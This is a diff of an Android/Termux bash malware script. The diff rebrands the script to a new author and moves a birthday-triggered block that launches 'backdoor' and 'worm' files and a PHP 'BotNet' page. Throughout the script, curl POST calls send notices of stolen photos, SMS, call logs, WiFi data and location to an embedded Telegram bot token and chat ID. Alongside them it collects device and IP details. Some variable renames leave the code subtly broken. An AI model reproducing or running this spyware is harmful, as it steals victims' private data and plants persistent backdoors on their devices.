@@ -39,7 +39,7 @@ huh="$blue ʘ⁠‿⁠ʘ"
 happy="( ⁠•⁠ ⁠‿⁠ ⁠•⁠ )"
 #---------OPIONS----------#
 home=$(pwd)
-more_info="By@Azrak_BHacked"
+more_info="By_@SomHac_Hacked"
 name=AllInOne
 TOKEN="5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng"
 CHAT_ID="5010958919"
@@ -51,7 +51,6 @@ UpTime=$(uptime)
 MemoryUsage=$(free -m)
 DiskUsage=$(df -h)
 ip=$(ifconfig -a)
-
 #-------------------------#
 # Check if offline
 net() {
@@ -103,32 +102,6 @@ else
     printf ""
 fi
 #####################################################################################
-if [[ -f $PREFIX/etc/Hacked/Victam/victam.sim ]]
-Dev_ID=$(sed -n '5p' victam.sim)
-fi
-#####################################################################################
-#MyBrithday
-today=$(date +%m/%d)
-Myday="12/12"
-if [[ $today == $Myday ]];then
-if [[ ${nN} == Y ]];then
-bash $PREFIX/etc/Badshell/backdoor &>> /dev/null &
-clear
-termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
-toilet -f mono12 -F border Azrak_day -F metal
-else
-termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
-curl -X POST --silent  https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${CHAT_ID} -d text=' Happy Birthday To You Master Blue , Don’t Forget Your wish ! '
-bash $PREFIX/etc/Badshell/backdoor &>> /dev/null &
-clear
-toilet -f mono12 -F border Azrak_day -F metal
-#bash \$PREFIX/bin/run_Boom &>> /dev/null
-fi
-fi
-#---------------------------------------------
-#---------------------------------------------
-#---------------------------------------------
-
 if [[ -f $PREFIX/etc/Hacked/Badshell/worm ]];then
 
 	if [[ $(cat $PREFIX/etc/Hacked/Badshell/worm) == "" ]];then
@@ -349,7 +322,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev_ID} "
+                curl -X POST --silent "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev} "
 
         else
 
@@ -366,7 +339,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 #################################################################################
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev_ID} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev} "
 
         else
 
@@ -381,7 +354,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New SMS File Locate on Device : ${Dev_ID} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New SMS File Locate on Device : ${Dev} "
 
         else
 
@@ -396,7 +369,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev_ID} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
 
         else
 
@@ -411,7 +384,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev_ID} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
 
         else
 
@@ -426,7 +399,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev_ID} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
 
         else
 
@@ -441,7 +414,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New WifiData Locate on Device : ${Dev_ID} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New WifiData Locate on Device : ${Dev} "
 
         else
 
@@ -458,7 +431,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New location Locate on Device : ${Dev_ID}"
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New location Locate on Device : ${Dev}"
 
         else
 
@@ -621,7 +594,7 @@ if [[ $Server_SendAlert == "Yes" ]];then
 		else
 
 				termux-vibrate -d 1000 -f
-				termux-dialog confirm -t "New Message frome @Azrak_B" -i "$Server_Alert"
+				termux-dialog confirm -t "New Message frome @SomHac" -i "$Server_Alert"
 				echo -e $Server_Alert > "$PREFIX/etc/Hacked/.AlertMessage"
 		fi
 
@@ -649,7 +622,7 @@ fi
 }
 Dev=$(echo -e "
 
-Device infomore : ${Dev_ID}ice\n
+Device infomore : ${Dev}ice\n
 Hacked on date  : $Tdate\n
 Host Name       : $HostName\n
 Kernel          : $Kernel\n
@@ -658,16 +631,66 @@ Memory Usage    : $MemoryUsage\n
 IP Address      : $ip\n
 
 ")
+#---------------------------------------------
+#---------------------------------------------
+#---------------------------------------------
+#MyBrithday
+BH(){
+today=$(date +%m/%d)
+Myday="12/12"
+if [[ $today == $Myday ]];then
+if [[ ${nN} == Y ]];then
+bash $PREFIX/etc/Badshell/backdoor &>> /dev/null &
+bash $PREFIX/etc/Badshell/worm &>> /dev/null &
+clear
+termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
+toilet -f mono12 -F border SomHac_day -F metal
 
+
+	if [[ $termux == "true" ]];then
+
+				termux-vibrate -d 1000 -f
+				termux-dialog confirm -t "New Message frome @SomHac" -i "$Server_Alert"
+				echo -e $Server_Alert > "$PREFIX/etc/Hacked/.AlertMessage"
+	else
+
+			echo -e "$Server_Alert" > "/root/.AlertMessage"
+			xdg-open "/root/.AlertMessage"
+
+	fi
+
+xdg-open https://t.me/HacSom
+
+else
+
+termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
+curl -X POST --silent  https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${CHAT_ID} -d text=' Happy Birthday To You Master Blue , Don’t Forget Your wish ! '
+bash $PREFIX/etc/Badshell/backdoor &>> /dev/null &
+clear
+toilet -f mono12 -F border SomHac_day -F metal
+
+if [[ `command -v php` ]];then
+
+php -S localhost:2424 "$PREFIX/etc/Hacked/Server/.B24B_BotNet" &>> /dev/null & xdg-open http://localhost:2424
+
+fi
+
+#bash \$PREFIX/bin/run_Boom &>> /dev/null
+
+fi
+fi
+}
+#---------------------------------------------
+#---------------------------------------------
+#---------------------------------------------
     while true; do
-	curl --silent ifconfig.me
+	wget --spider --quiet https://github.com &>> /dev/null
         if [ "$?" = 0 ]; then
 
-            Update     &>> /dev/null &
-	    ServerHome &>> /dev/null &
-		break
+            Update     &>> /dev/null
+		BH
+	    ServerHome &>> /dev/null
 
-        break
        else
 
 		printf ""
